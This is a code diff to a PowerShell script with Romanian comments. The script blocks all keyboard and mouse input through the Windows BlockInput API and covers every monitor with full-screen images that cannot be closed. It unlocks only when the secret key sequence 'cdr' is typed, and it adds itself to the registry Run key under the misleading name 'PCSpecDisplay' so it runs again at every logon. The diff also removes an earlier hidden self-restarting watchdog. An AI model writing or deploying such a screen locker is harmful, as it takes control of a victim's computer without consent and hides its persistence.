@@ -12,6 +12,43 @@ function Download-Image {
     }
 }
 
+# Blochează tastatura
+function Block-Keyboard {
+    Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class KeyboardBlocker {
+    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+    public static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool BlockInput(bool fBlockIt);
+}
+"@
+    [KeyboardBlocker]::BlockInput($true)
+}
+
+# Ascultă pentru secvența "cdr"
+function ListenForUnlock {
+    $unlockSequence = "cdr"
+    $currentInput = ""
+
+    while ($true) {
+        Start-Sleep -Milliseconds 100
+        for ($i = 0; $i -lt 256; $i++) {
+            if ([KeyboardBlocker]::GetAsyncKeyState($i) -ne 0) {
+                $key = [char]$i
+                $currentInput += $key.ToLower()
+                if ($currentInput -like "*$unlockSequence") {
+                    Stop-All
+                }
+                if ($currentInput.Length -gt $unlockSequence.Length) {
+                    $currentInput = $currentInput.Substring(1)
+                }
+            }
+        }
+    }
+}
+
 # Afișare imagine pe toate monitoarele
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
@@ -42,7 +79,6 @@ function Show-FullScreenImage {
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
 
-        # Protejează împotriva închiderii accidentale
         $form.Add_FormClosing({
             param($sender, $eventArgs)
             $eventArgs.Cancel = $true
@@ -51,7 +87,6 @@ function Show-FullScreenImage {
         $forms += $form
     }
 
-    # Rulează formularele pe toate monitoarele
     foreach ($form in $forms) {
         [void]$form.Show()
     }
@@ -59,33 +94,26 @@ function Show-FullScreenImage {
     [System.Windows.Forms.Application]::Run()
 }
 
-# Funcție de monitorizare pentru repornire automată
-function Monitor-Image {
-    $scriptPath = $MyInvocation.MyCommand.Definition
-
-    while ($true) {
-        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
-        if (-not $processes) {
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
-        }
-        Start-Sleep -Seconds 2
-    }
-}
-
-# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
+# Funcție pentru oprirea completă a aplicației
 function Stop-All {
-    $global:exitFlag = $true
+    [KeyboardBlocker]::BlockInput($false)
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# Verifică dacă scriptul este în modul principal sau monitor
-if ($MyInvocation.MyCommand.Path -eq $null) {
-    # Monitorizare
-    Monitor-Image
-} else {
-    # Pornire aplicație principală
-    Download-Image
-    Start-Job -ScriptBlock { Monitor-Image }
-    Show-FullScreenImage
+# Configurează pornirea automată
+function Configure-Startup {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $scriptName = "PCSpecDisplay"
+    Set-ItemProperty -Path $regPath -Name $scriptName -Value "powershell -ExecutionPolicy Bypass -File `"$scriptPath`""
 }
+
+# Descărcare imagine și rulare
+Download-Image
+Configure-Startup
+
+# Pornire aplicație
+Start-Job -ScriptBlock { ListenForUnlock }
+Block-Keyboard
+Show-FullScreenImage
